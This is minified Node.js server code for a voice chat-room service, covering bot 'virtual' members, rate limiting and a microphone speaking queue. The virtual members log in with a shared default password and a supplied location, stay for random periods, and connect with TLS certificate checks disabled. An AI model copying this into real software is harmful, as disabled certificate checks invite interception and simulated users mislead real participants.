            if (s.config.local) var o = e.connect("http://localhost:" + s.config.port, {
                query: "ADMIN_HASH=" + s.config.adminHash
            });
            else {
                var i = s.config.host.substring(0, s.config.host.length - 1);
                o = e.connect(i + ":" + s.config.port, {
                    rejectUnauthorized: !1,
                    query: "ADMIN_HASH=" + s.config.adminHash
                })
            }
            o.emit("req", r.enc({
                type: "SET_LOCATION",
                data: {
                    ip: t.ip,
                    country: t.country,
                    device: t.device
                }
            }), () => {
                o.emit("req", r.enc({
                    type: "MEMBER_LOGIN",
                    data: {
                        name: t.name,
                        password: "#virtuals_default_password#",
                        hidden: !1
                    }
                }), e => {
                    this.joinRoomTimeout = setTimeout(() => {
                        o.emit("req", r.enc({
                            type: "JOIN_ROOM",
                            data: {
                                id: e,
                                password: null
                            }
                        }), e => {})
                    }, 5e3)
                })
            }), setTimeout(() => {
                this.joinRoomTimeout && clearTimeout(this.joinRoomTimeout), o.disconnect()
            }, 60 * Math.floor(90 * Math.random() + 60) * 1e3)
        } catch (e) {
            console.log(e.stack)
        }
    }
}, function(e, t) {
    e.exports = require("socket.io-client")
}, function(e, t) {
    function s(e) {
        this.store = e
    }
    s.prototype.check = function(e, t, s, r) {
        try {
            if (e.requests[t] || (e.requests[t] = []), e.requests[t].push(Date.now()), e.requests[t].length > r) {
                for (var o = [], i = 0; i < r; i++) o.push(e.requests[t][e.requests[t].length - r + i]);
                o[r - 1] - o[0] <= 1e3 * s && (e.socket && e.socket.disconnect(), e.logout()), e.requests[t] = o
            }
        } catch (e) {
            log(e)
        }
    }, e.exports = s
}, function(e, t, s) {
    const r = s(1),
        o = s(0);

    function i(e) {
        this.config = {}, this.config.global = void 0 !== this.config.global, this.store = e, this.io = e.io, this.permissions = e.permissions, this.interval = 0, this.speaker = null, this.room = Date.now() + "", this.subscribers = [], this.listeners = [], this.speakerTimeoutID = null
    }
    i.prototype.requestMic = function(e) {
        if (e instanceof r) return this.permissions.getRadioSpeakTime(e.role) ? void(this.speaker ? this.subscribe(e) : this.speak(e)) : e.socket.emit("res", o.enc({
            type: "NO_MIC_PERMISSIION",
            data: {}
        }))
    }, i.prototype.unRequestMic = function(e) {
        e && (this.speaker && this.speaker.id == e.id ? this.stopSpeaking(e) : this.unsubscribe(e))
    }, i.prototype.speak = function(e) {
        if (!e) return;
        this.speaker = e, this.interval = 60 * this.permissions.getRadioSpeakTime(e.role) * 1e3, this.speaker.socket.emit("res", o.enc({
            type: "MIC_START_SPEAKING",
            data: {
                room: this.room
            }
        })), this.listeners = this.listeners.filter(e => this.speaker.id != e.id), e.micStatus.onMic = !0, e.micStatus.onHand = !1, e.micStartedAt = this.interval + Date.now();
        const t = {
            micStatus: e.micStatus,
            micTime: e.getMicTime()
        };
        this.store.io.emit("res", o.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        })), this.broadcast(), this.speakerTimeoutID = setTimeout(() => {
            this.stopSpeaking(e)
        }, this.interval)
    }, i.prototype.stopSpeaking = function(e) {
        this.speaker.socket.emit("res", o.enc({
            type: "MIC_STOP_SPEAKING",
            data: {}
        })), e.micStatus.onMic = !1, e.micStartedAt = null;
        const t = {
            micStatus: e.micStatus
        };
        this.store.io.emit("res", o.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        })), this.stopBroadcasting(), this.speakerTimeoutID && (clearTimeout(this.speakerTimeoutID), this.speakerTimeoutID = null), this.startListening(e), this.speaker = null;
        var s = this.subscribers[0];
        this.speak(s), this.unsubscribe(s)
    }, i.prototype.getSpeaker = function() {
        return this.speaker
    }, i.prototype.broadcast = function() {
        this.listeners.forEach(e => {
            e.socket.emit("res", o.enc({
                type: "MIC_START_LISTENING",
                data: {
                    room: this.room
                }
            }))
        })
    }, i.prototype.stopBroadcasting = function() {
        this.listeners.forEach(e => {
            e.socket.emit("res", o.enc({
                type: "MIC_STOP_LISTENING",
                data: {}
            }))
        })
    }, i.prototype.startListening = function(e) {
        this.listeners.filter(t => t.id == e.id).length || this.listeners.push(e), this.speaker && e.socket.emit("res", o.enc({
            type: "MIC_START_LISTENING",
            data: {
                room: this.room
            }
        }))
    }, i.prototype.stopListening = function(e) {
        this.speaker && (this.listeners = this.listeners.filter(t => t.id != e.id), e.socket.emit("res", o.enc({
            type: "MIC_STOP_LISTENING",
            data: {}
        })))
    }, i.prototype.subscribe = function(e) {
        this.subscribers.push(e), e.micStatus.onHand = !0;
        const t = {
            micStatus: e.micStatus
        };
        this.store.io.emit("res", o.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        }))
    }, i.prototype.unsubscribe = function(e) {
        if (!e) return;
        this.subscribers = this.subscribers.filter(function(t) {
            return t.id != e.id
        }), e.micStatus.onHand = !1;
        const t = {
            micStatus: e.micStatus
        };
        this.store.io.emit("res", o.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        }))
    }, i.prototype.getSubscribers = function() {
        return this.subscribers
    }, i.prototype.getSubscriber = function(e) {
        return this.subscribers.filter(function(e) {
            return e.id == user.id
        })[0]
    }, i.prototype.isSubscribed = function(e) {
        return !!this.subscribers.filter(function(t) {
            return t.id == e.id
        }).length
    }, e.exports = i
}]);